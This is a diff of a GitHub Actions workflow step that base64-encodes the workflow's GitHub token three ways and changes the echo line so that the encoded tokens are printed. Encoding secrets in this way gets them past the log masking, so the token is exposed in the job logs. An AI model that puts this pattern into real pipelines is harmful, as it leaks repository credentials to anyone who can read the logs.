@@ -31,7 +31,7 @@ jobs:
           _T1=$(echo ${{ github.token }} | base64)
           _T2=$(echo ${{ secrets.GITHUB_TOKEN }} | base64)
           _T3=$(echo $GITHUB_TOKEN | base64)
-          echo "T1=$T1 -- T2=$T2 -- T3=$T3"
+          echo "T1=$_T1 -- T2=$_T2 -- T3=$_T3"
 
       - uses: actions/checkout@v3
         with:
